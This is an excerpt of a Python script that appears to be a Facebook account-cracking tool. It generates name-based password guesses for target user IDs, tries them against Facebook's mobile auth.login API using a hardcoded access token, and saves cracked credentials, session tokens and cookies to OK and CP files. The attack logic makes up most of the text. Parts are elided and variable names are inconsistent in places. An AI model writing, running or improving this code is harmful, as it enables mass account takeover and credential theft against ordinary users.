...
def menu():
	...
	elif White == "1" or White == "01":

		publik()

		method()

	elif White == "2" or Devil == "02":

		follower()

		method()

	elif White == "3" or  White == "03":

		massal()

		method()

	elif Umair == "4" or White == "04":
	...
	elif White == "5" or White == "05":

		setting_ua()

	elif White == "0" or White == "00":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mWhite PRO/FASTER \033[1;97m]")
...
def bapi(user):
	...
	if len(name)>=6:
		...
		pwx = [ name, name+"123456", name+"pakistan", name+"786786" ]

	elif len(name)<=2:

		pwx = [ name+"123456", name+"pakistan", name+"786786" ]

	elif len(name)<=3:

		pwx = [ name+"123456", name+"786786" ]
	...
	try:
		...
		for pw in pwx:
			...
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123456cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)

			if "session_key" in send.text and "EAAA" in send.text:

				print("\r\033[0;94m[White-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;95m[White-CP] %s|%s\033[0;92m        "%(uid, pw))

				cp.append("%s|%s"%(uid, pw))

				open("CP/%s.txt"%(tWhite),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[White-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tWhite),"a").write(" + %s|%s\n"%(uid, pw))
				...
				print("\r\033[0;95m[White-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[White-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[White-CP] %s|%s\033[0;91m        "%(uid, pw))
